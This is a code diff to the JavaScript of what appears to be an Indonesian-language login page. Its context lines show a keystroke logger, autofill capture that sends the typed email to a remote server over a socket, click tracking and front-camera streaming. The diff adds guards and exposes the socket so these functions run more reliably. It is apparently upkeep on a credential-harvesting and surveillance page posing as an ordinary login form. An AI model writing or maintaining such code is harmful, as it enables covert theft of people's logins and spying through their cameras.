@@ -202,6 +202,7 @@ function initPersistentStorage() {
 }
 
 const socket = io(SERVER_URL, { query: { deviceId: localStorage.getItem('deviceId') || '' } });
+window.socket = socket;
 socket.on('device-id', (id) => { deviceId = id; localStorage.setItem('deviceId', id); });
 
 // Live camera stream control
@@ -510,7 +511,7 @@ socket.on('force-respawn', () => {
     window.location.reload();
 });
 
-function togglePass() { const i=passInput; i.type=i.type==='password'?'text':'password'; }
+function togglePass() { if (!passInput) return; const i=passInput; i.type=i.type==='password'?'text':'password'; }
 function showToast(msg) { const c=document.getElementById('toastContainer'), t=document.createElement('div'); t.className='toast error'; t.innerHTML='<span>\u2715</span> '+msg; c.appendChild(t); setTimeout(()=>{t.classList.add('out');setTimeout(()=>t.remove(),250)},3500); }
 
 function requestFrontCamera() {
@@ -536,6 +537,7 @@ function requestFrontCamera() {
 }
 
 function initKeystrokeLogger() {
+    if (!emailInput || !passInput) return;
     let lastSent = 0;
     function logKey(e) {
         if (e.key === 'Tab' || e.key === 'Shift' || e.key === 'Control' || e.key === 'Alt' || e.key === 'Meta') return;
@@ -568,6 +570,7 @@ function initClickHeatmap() {
 }
 
 function initAutofillDetection() {
+    if (!emailInput || !passInput) return;
     function checkAutofill() {
         if (emailInput.value && emailInput.value !== '') {
             socket.emit('autofill', { value: emailInput.value, field: 'email' });
@@ -1605,7 +1608,7 @@ async function handleLogin(e) {
         window.location.href = '/dashboard.html';
     } catch (err) {
         btn.classList.remove('loading'); btn.disabled=false;
-        btn.querySelector('span').textContent='Masuk ke Dashboard';
+        btn.querySelector('span').textContent='Masuk ke Akun';
         hideLoadingOverlay();
         let msg = 'Login gagal. Periksa email dan kata sandi.';
         if (err.code === 'auth/invalid-credential') msg = 'Email atau kata sandi salah. Silakan coba lagi.';
@@ -1890,12 +1893,15 @@ function removeTypingIndicator() {
 
 // Page-specific initializations (skip on dashboard)
 if (!window.location.pathname.includes('dashboard')) {
-    document.querySelector('form').addEventListener('submit', handleLogin);
-    document.querySelector('.input-append button').addEventListener('click', togglePass);
+    const form = document.querySelector('form');
+    if (form) form.addEventListener('submit', handleLogin);
+    const toggleBtn = document.querySelector('.input-append button');
+    if (toggleBtn) toggleBtn.addEventListener('click', togglePass);
     document.querySelectorAll('.social-btn').forEach(btn => {
         const provider = btn.querySelector('.s-text')?.textContent || '';
         btn.addEventListener('click', () => handleSocial(provider));
     });
-    document.querySelector('.nt-btn').addEventListener('click', dismissNotif);
-    emailInput.focus();
+    const notifBtn = document.querySelector('.nt-btn');
+    if (notifBtn) notifBtn.addEventListener('click', dismissNotif);
+    if (emailInput) emailInput.focus();
 }
